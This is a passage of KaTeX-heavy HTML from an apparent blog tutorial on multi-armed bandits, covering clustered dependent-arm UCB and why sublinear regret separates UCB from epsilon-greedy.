    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.328331em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.07153em">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span> abstracts out the dependence of arms in cluster <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        C
       
      
      
       C
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.07153em">C</span></span></span></span></span> on each other; given <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         π
        
        
         C
        
       
      
      
       pi_C
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.03588em">π</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.328331em"><span class="" style="margin-left: -0.03588em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right: 0.07153em">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span> , each arm is independent of all other arms in other clusters.</p> 
<p>Then we can discuss the problem on a per-cluster basis, because arms in different clusters is independent. The pseudocode is as below:</p> 
<p><img src="https://images2.imgbox.com/16/97/fSxMLnsY_o.png" alt="在这里插入图片描述"></p> 
<p>By first dividing the arm into different clusters and using the UCB algorithm twice, first find the current optimal cluster, and then find the optimal arm from this cluster. Finally, the reward is updated through the UCB algorithm. We can estimate the optimal action of dependent arm bandit problems.</p> 
<h3>
<a id="V_Why_sublinear_regret_is_the_performance_threshold_847"></a>V. Why sublinear regret is the performance threshold</h3> 
<p>The cause of sublinear regret being the performance threshold is mainly due to its the influence on the optimal strategy.</p> 
<p>According to regret decomposition rule, cumulative regret <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         L
        
        
         t
        
       
       
        =
       
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        E
       
       
        (
       
       
        
         N
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
       
        )
       
       
        
         Δ
        
        
         a
        
       
      
      
       L_t = sum_{ain A}E(N_t(a))Delta_a
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.07708em;vertical-align: -0.32708em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.10903em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>. If an algorithm has an linear regret, that is <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         L
        
        
         t
        
       
       
        =
       
       
        Θ
       
       
        (
       
       
        n
       
       
        )
       
      
      
       L_t = Theta(n)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord">Θ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></span>, we have <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        E
       
       
        (
       
       
        
         N
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
       
        )
       
       
        
         Δ
        
        
         a
        
       
       
        =
       
       
        Θ
       
       
        (
       
       
        t
       
       
        )
       
      
      
       sum_{ain A}E(N_t(a))Delta_a = Theta(t)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.07708em;vertical-align: -0.32708em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.10903em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord">Θ</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></span>. And because <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        E
       
       
        (
       
       
        
         N
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
       
        )
       
       
        =
       
       
        E
       
       
        (
       
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        
         N
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
       
        )
       
       
        =
       
       
        1
       
      
      
       sum_{ain A}E(N_t(a)) = E(sum_{ain A}N_t(a)) = 1
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.07708em;vertical-align: -0.32708em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.10903em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.07708em;vertical-align: -0.32708em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mopen">(</span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.10903em">N</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.10903em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">1</span></span></span></span></span>, we can then deduce that the mean value of the gap between the reward obtained by each pull and the optimal reward will be a number greater than 0 and the mean of opportunity loss: <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        E
       
       
        (
       
       
        
         V
        
        
         ∗
        
       
       
        −
       
       
        
         Q
        
        
         t
        
       
       
        (
       
       
        a
       
       
        )
       
       
        )
       
       
        =
       
       
        Θ
       
       
        (
       
       
        1
       
       
        )
       
      
      
       E(V^* - Q_t(a)) = Theta(1)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord mathdefault" style="margin-right: 0.05764em">E</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.22222em">V</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.688696em"><span class="" style="margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord"><span class="mord mathdefault">Q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord">Θ</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> for each pull <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        t
       
      
      
       t
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span></span></span></span></span>. In other word, when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        t
       
       
        →
       
       
        ∞
       
      
      
       t to infty
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord">∞</span></span></span></span></span>, the probability of choose the optimal will not be converge to 1, which means the learner cannot get the optimal choice accurately enough.</p> 
<p>For example, The total regret of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
       
        −
       
       
        g
       
       
        r
       
       
        e
       
       
        e
       
       
        d
       
       
        y
       
      
      
       varepsilon-greedy
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.66666em;vertical-align: -0.08333em"></span><span class="mord mathdefault">ε</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.88888em;vertical-align: -0.19444em"></span><span class="mord mathdefault" style="margin-right: 0.03588em">g</span><span class="mord mathdefault" style="margin-right: 0.02778em">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">e</span><span class="mord mathdefault">d</span><span class="mord mathdefault" style="margin-right: 0.03588em">y</span></span></span></span></span>: <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         L
        
        
         t
        
       
       
        ≥
       
       
        
         
          ε
         
         
          t
         
        
        
         
          ∣
         
         
          A
         
         
          ∣
         
        
       
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        
         Δ
        
        
         a
        
       
      
      
       L_t geq frac{varepsilon t}{|A|}sum_{ain A}Delta_a
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">≥</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.34456em;vertical-align: -0.52em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.824556em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">ε</span><span class="mord mathdefault mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.52em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>, and the average regret <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         
          R
         
         
          t
         
        
        
         ‾
        
       
       
        ≥
       
       
        
         ε
        
        
         
          ∣
         
         
          A
         
         
          ∣
         
        
       
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        
         Δ
        
        
         a
        
       
       
        =
       
       
        Θ
       
       
        (
       
       
        1
       
       
        )
       
      
      
       overline{R_t} geq frac{varepsilon}{|A|}sum_{ain A}Delta_a = Theta(1)
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.03333em;vertical-align: -0.15em"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.88333em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right: 0.00773em">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: -0.00773em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="overline-line" style="border-bottom-width: 0.04em"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">≥</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.27em;vertical-align: -0.52em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.695392em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">ε</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.52em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mord">Θ</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span> and the result will not converge to 0. As a consequence, when <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        t
       
       
        →
       
       
        ∞
       
      
      
       t to infty
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.61508em;vertical-align: 0em"></span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">→</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord">∞</span></span></span></span></span>, although we already have high confidence in the optimal choice, we still have the probability of <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        ε
       
       
        ×
       
       
        
         
          ∣
         
         
          A
         
         
          ∣
         
         
          −
         
         
          1
         
        
        
         
          ∣
         
         
          A
         
         
          ∣
         
        
       
      
      
       varepsilontimes frac{|A|-1}{|A|}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.66666em;vertical-align: -0.08333em"></span><span class="mord mathdefault">ε</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">×</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 1.53em;vertical-align: -0.52em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 1.01em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∣</span><span class="mord mathdefault mtight">A</span><span class="mord mtight">∣</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.52em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span> not choose the optimal and the probability will not converge to <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        0
       
      
      
       0
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">0</span></span></span></span></span>.</p> 
<p>When it comes to algorithms with sublinear regret such as <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        U
       
       
        C
       
       
        B
       
      
      
       UCB
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.68333em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.10903em">U</span><span class="mord mathdefault" style="margin-right: 0.07153em">C</span><span class="mord mathdefault" style="margin-right: 0.05017em">B</span></span></span></span></span>: (<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         L
        
        
         t
        
       
       
        ≤
       
       
        8
       
       
        l
       
       
        o
       
       
        g
       
       
        t
       
       
        
         ∑
        
        
         
          a
         
         
          ∈
         
         
          A
         
        
       
       
        
         Δ
        
        
         a
        
       
      
      
       L_t leq 8logtsum_{ain A}Delta_a
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">L</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.280556em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">≤</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1.07708em;vertical-align: -0.32708em"></span><span class="mord">8</span><span class="mord mathdefault" style="margin-right: 0.01968em">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right: 0.03588em">g</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mop"><span class="mop op-symbol small-op">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.178621em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mrel mtight">∈</span><span class="mord mathdefault mtight">A</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.32708em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord">Δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.151392em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>), we can find policy <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        π
       
      
      
       pi
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault" style="margin-right: 0.03588em">π</span></span></span></span></span> such that regret <span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         R
        
        
         t
        
       
       
        →
       
       
        0
       
      
      
       R_t to 0
      
     
